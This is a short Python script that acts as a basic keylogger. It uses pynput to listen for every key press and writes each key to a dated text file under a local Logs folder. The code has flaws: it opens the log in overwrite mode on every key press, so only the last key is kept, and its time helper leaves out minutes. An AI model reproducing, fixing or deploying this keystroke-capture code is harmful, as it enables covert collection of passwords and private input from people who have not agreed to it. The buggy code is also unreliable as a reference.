from pynput.keyboard import Listener
import os
from datetime import datetime as dt


def setup():
    now = dt.now()
    if not os.path.exists('Logs'):
        os.mkdir('Logs')
    if not os.path.exists(f'Logs/{now.month}'):
        os.mkdir(f'Logs/{now.month}')
    if not os.path.exists(f'Logs/{now.month}/{now.day}.txt'):
        with open(f'Logs/{now.month}/{now.day}.txt', 'w') as f:
            f.close()
      
    
def get_time():
    now = dt.now()
    return f'{now.hour}:{now.second}'
def on_press(key):
    key = str(key)
    now = dt.now()
    with open(f'Logs/{now.month}/{now.day}.txt', 'w') as f:
        f.write(key + '\n')
        f.close()
 

def run():
    setup()
    with Listener(on_press=on_press) as listener:
        listener.join()

